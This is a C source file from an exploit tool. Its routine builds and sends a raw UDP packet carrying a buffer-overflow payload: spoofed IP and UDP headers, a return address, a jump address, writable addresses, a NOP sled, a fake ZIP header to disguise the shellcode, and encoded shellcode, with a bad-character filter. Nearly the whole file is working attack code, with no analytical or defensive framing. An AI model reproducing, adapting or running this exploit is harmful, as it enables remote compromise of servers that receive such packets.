/* Copyright© 2004-2008 Nelson Brito
 * This file is part of the ENG Private Tool by Nelson Brito.

   This program is free software; you can redistribute it and/or modify it under
   the terms of the GNU General Public License  version 2, 1991  as published by
   the Free Software Foundation.

   This program is distributed  in the hope that it will be useful,  but WITHOUT
   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
   FOR A PARTICULAR PURPOSE.  
   
   See the GNU General Public License for more details.

   A copy of the GNU General Public License can be found at:
   http://www.gnu.org/licenses/gpl.html
   or you can write to:
   Free Software Foundation, Inc.
   59 Temple Place - Suite 330
   Boston, MA  02111-1307
   USA. */
#ifndef SENDEXP_C__
#define SENDEXP_C__ 1
/* Nelson Brito <nbrito@sekure.org>
   $Id: sendexp.c,v 1.12 2008-09-14 17:57:14-03 nbrito Exp $ */
#include "common.h"

/* Raw pkt sending routine. 
   Returns the a of sendto(). */
const int32_t sendexp(struct options options, struct shellcode shellcode, struct offset offset){
	int32_t    a,                /* status to be returned  */
		   b;                /* socket                 */
	u_int32_t  c = 1,
		   d,                /* simple counter         */
		   wrt,              /* writable address       */
		   ftr;              /* filter bad chars       */
	u_int64_t  jmp  = process_jmpaddr(jmp);
	struct     timeval  seed;    /* seed for random        */
	struct     sockaddr_in sin;  /* socket address         */

#ifndef __CYGWIN__

	struct     iphdr  * ip;      /* IP header              */ 
	struct     udphdr * udp;     /* UDP header             */
	struct     psdhdr * pseudo;  /* PSEUDO header          */

#endif /* __CYGWIN__ */
		   /* Setting vector, random strings and random NOPs.  */
	u_int8_t   vtr  = 0x04,
		 * str  = (u_int8_t *)process_string(str, 97),
		   /* Using the jmp to calculate the length of NOPs. */
		 * nops = (u_int8_t *)process_string(nops, ((jmp >> 8) & 0xff) - (sizeof(int64_t) * 2)),
		 * bff  = alpha2(options, bff, shellcode),
		   /* The following 5 bytes is a technique introduced in shellcode
		      obfuscation by izik (izik@tty64.org>.

		      Basically the 5 bytes impersontes a ZIP Header, and make the
		      binary version of shellcode being interpreted as valid ZIP file.

		      For further information about this technique go to:
		      http://www.tty64.org/ */
		 * zip  = "\x50\x4b\x03\x04\x24",
		   /* Setting the size of Data Field and Packet. */
		   dat[sizeof(vtr) + strlen(str) \
			+ sizeof(offset.offset) + sizeof(jmp) \
			+ (sizeof(wrt) * 2) + strlen(nops) \
			+ strlen(zip) + strlen(bff)];
#ifndef __CYGWIN__

		   /* Setting the size of Packet. */
	u_int8_t   pkt[IPHDR_SIZE + UDPHDR_SIZE + sizeof(dat)],
		   /* Setting the size of Checksum. */
		   sum[PSDHDR_SIZE + UDPHDR_SIZE + sizeof(dat)];

	/* Setting RAW socket. */
	if((b = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
		perror("socket()");
		exit(EXIT_FAILURE);
	}

	/* Setting IP_HDRINCL. */
	if(setsockopt(b, IPPROTO_IP, IP_HDRINCL, (int8_t *)&c, sizeof(c)) < 0){
		perror("setsockopt()");
		exit(EXIT_FAILURE);
	}
	
#else   /* __CYGWIN__ */

	/* Setting UDP socket. */
	if((b = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0){
		perror("socket()");
		exit(EXIT_FAILURE);
	}

#endif  /* __CYGWIN__ */

	/* Setting SOCKADDR structure. */
	sin.sin_family      = AF_INET;
	sin.sin_port        = htons(options.dest);
	sin.sin_addr.s_addr = options.daddr;

redo:   /* That is the REDO point. :-) */
	/* Using microseconds as seed. */
	gettimeofday(&seed, (struct timezone *)0);
	srand((unsigned) seed.tv_usec);

	/* Setting writable address. */
	wrt = 0x42af4930 + (rand() & 0x00000087);

	/* XXX - We have to filter the bad characteres:
	   0x00, 0x0a, 0x0d, 0x2f, 0x3a, and 0x5c. */
	for(d = 0 ; d < (sizeof(wrt) * 3) ; d += (sizeof(wrt) * 2)){
		ftr = (wrt >> d) & 0xff;
		if((ftr == 0x00)||(ftr == 0x0a)||(ftr == 0x0d)||\
		   (ftr == 0x2f)||(ftr == 0x3a)||(ftr == 0x5c))
			/* Some people said this is awful, horrible, terrrible,
			   extremely bad. 
			   
			   But, you know what? 
			   It works very fine, and I don't fear the goto! :) */
			goto redo;
	}

#ifndef __CYGWIN__

	/* Building the Packet.
	   Zeroing the content of the Packet. */
	memset(&pkt, 0, sizeof(pkt));

	/* Packet making a pointer to IP Header structure. */
	ip                = (struct iphdr *) pkt;
	ip->version       = IPVERSION;
	ip->ihl           = IPHDR_SIZE/4;
	ip->tos           = options.tos;
	ip->tot_len       = htons(IPHDR_SIZE + UDPHDR_SIZE + sizeof(dat));
	ip->id            = htons(options.id);
	ip->ttl           = options.ttl;
	ip->protocol      = IPPROTO_UDP;
	ip->saddr         = INADDR_RND(options.saddr);
	ip->daddr         = options.daddr;
	ip->check         = in_cksum((u_int16_t *)&ip, htons(ip->tot_len));

	/* Packet making a pointer to UDP Header structure. */
	udp               = (struct udphdr *)(pkt + IPHDR_SIZE);
	udp->source       = htons(IPPORT_RND(options.source)); 
	udp->dest         = htons(options.dest);
	udp->len          = htons(UDPHDR_SIZE + sizeof(dat));
	udp->check        = 0;

#endif  /* __CYGWIN__ */

	/* Building the Data Field.
	   Zeroing the content of the Data Field. 
	  
	   XXX Here is some gotchas XXX
	   (1) Gets the last NULL free byte and used the total length
	   of dat until NULL is reached. The math is very simples and
	   usefull to have a clean code.
	   (2) The only reason the strlen(bff) is used is that all
	   dat copied to dat variable is NULL free and memset was
	   used to get NULL in all Data Field content. */
	memset(&dat, 0, sizeof(dat));

	/* Copying the Attack Vector to Data Field. */
	memcpy(dat, (u_int8_t *)&vtr, sizeof(vtr));

	/* Copying the Random String to Data Field. */
	memcpy(dat + strlen(dat), str, strlen(str));

	/* Copying the Return Address to Data Field. */
	memcpy(dat + strlen(dat), (u_int32_t *)&offset.offset, sizeof(offset.offset));

	/* Copying the Jump Address to Data Field. */
	memcpy(dat + strlen(dat), (u_int64_t *)&jmp, sizeof(jmp));

	/* Copying twice the Writable Address to Data Field. */
	memcpy(dat + strlen(dat), (u_int32_t *)&wrt, sizeof(wrt));
	memcpy(dat + strlen(dat), (u_int32_t *)&wrt, sizeof(wrt));
	
	/* Copying the NOPs to Data Field. */
	memcpy(dat + strlen(dat), nops, strlen(nops));

	/* Copying the Injection code to Data Field. */
	memcpy(dat + strlen(dat), zip, strlen(zip));

	/* Copying the Shellcode to Data Field. */
	memcpy(dat + strlen(dat), bff, strlen(bff));

#ifndef __CYGWIN__

	/* Copying the Data Field to the Packet. */
	memcpy(pkt + IPHDR_SIZE + UDPHDR_SIZE, dat, sizeof(dat));

	/* Building the Checksum Packet.
	   Zeroing the content of the sum. */
	memset(&sum, 0, sizeof(sum));
	
	/* Checksum Packet making a pointer to PSEUDO Header structure. */
	pseudo            = (struct psdhdr *)(sum);
	pseudo->saddr     = ip->saddr;
	pseudo->protocol  = ip->protocol;
	pseudo->daddr     = ip->daddr;
	pseudo->zero      = 0;
	pseudo->len       = htons(UDPHDR_SIZE + sizeof(dat));
	
	/* Copying the UDP header to the sum. */
	memcpy(sum + PSDHDR_SIZE, udp, UDPHDR_SIZE);

	/* Copying the dat field to sum. */
	memcpy(sum + PSDHDR_SIZE + UDPHDR_SIZE, dat, sizeof(dat));

	/* Computing the sum. */
	udp->check        = in_cksum((u_int16_t *)&sum, UDPHDR_SIZE + PSDHDR_SIZE + sizeof(dat));

	/* Sending pkt.                                    */
	if((a = sendto(b, &pkt, sizeof(pkt), 0, (struct sockaddr *) &sin, sizeof(struct sockaddr))) < 0){
		perror("sendto()");
		exit(EXIT_FAILURE);
	}

#else   /* __CYGWIN__ */

	if((a = connect(b, (struct sockaddr *) &sin, sizeof (struct sockaddr_in))) < 0){
		perror("connect()");
		exit(EXIT_FAILURE);
	}

	send(b, dat, strlen(dat), 0);

#endif  /* __CYGWIN__ */

	/* Returning the a. */
	return(a);
}
#endif  /* SENDEXP_C__ */
